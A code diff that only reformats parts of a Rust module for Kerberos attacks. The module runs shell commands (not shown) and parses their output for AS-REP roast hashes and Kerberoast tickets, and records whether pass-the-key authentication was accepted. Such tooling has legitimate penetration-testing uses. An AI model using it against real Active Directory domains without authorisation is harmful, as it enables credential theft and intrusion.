@@ -24,22 +24,31 @@ impl KerberosAttack {
         match Command::new("sh").arg("-c").arg(&cmd).output() {
             Ok(out) => {
                 let stdout = String::from_utf8_lossy(&out.stdout);
-                let hashes: Vec<&str> = stdout.lines()
+                let hashes: Vec<&str> = stdout
+                    .lines()
                     .filter(|l| l.contains("$krb5asrep$"))
                     .collect();
                 let success = !hashes.is_empty();
                 if success {
                     info!("AS-REP: found {} roastable users", hashes.len());
                 }
-                let detail_users: Vec<String> = hashes.iter().take(3).map(|h| {
-                    let parts: Vec<&str> = h.splitn(2, ':').collect();
-                    parts.first().unwrap_or(h).to_string()
-                }).collect();
+                let detail_users: Vec<String> = hashes
+                    .iter()
+                    .take(3)
+                    .map(|h| {
+                        let parts: Vec<&str> = h.splitn(2, ':').collect();
+                        parts.first().unwrap_or(h).to_string()
+                    })
+                    .collect();
                 KrbResult {
                     attack: "AS-REP Roast".into(),
                     target: format!("{}/{}", domain, dc_ip),
                     success,
-                    output: format!("hashes_found={}, details={}", hashes.len(), detail_users.join(", ")),
+                    output: format!(
+                        "hashes_found={}, details={}",
+                        hashes.len(),
+                        detail_users.join(", ")
+                    ),
                 }
             }
             Err(e) => KrbResult {
@@ -61,9 +70,8 @@ impl KerberosAttack {
         match Command::new("sh").arg("-c").arg(&cmd).output() {
             Ok(out) => {
                 let stdout = String::from_utf8_lossy(&out.stdout);
-                let tickets: Vec<&str> = stdout.lines()
-                    .filter(|l| l.contains("$krb5tgs$"))
-                    .collect();
+                let tickets: Vec<&str> =
+                    stdout.lines().filter(|l| l.contains("$krb5tgs$")).collect();
                 let success = !tickets.is_empty();
                 KrbResult {
                     attack: "Kerberoast".into(),
@@ -96,7 +104,11 @@ impl KerberosAttack {
                     attack: "PTK".into(),
                     target: format!("{}@{}", service, target),
                     success,
-                    output: if success { "Kerberos auth accepted".into() } else { stdout.to_string() },
+                    output: if success {
+                        "Kerberos auth accepted".into()
+                    } else {
+                        stdout.to_string()
+                    },
                 }
             }
             Err(e) => KrbResult {
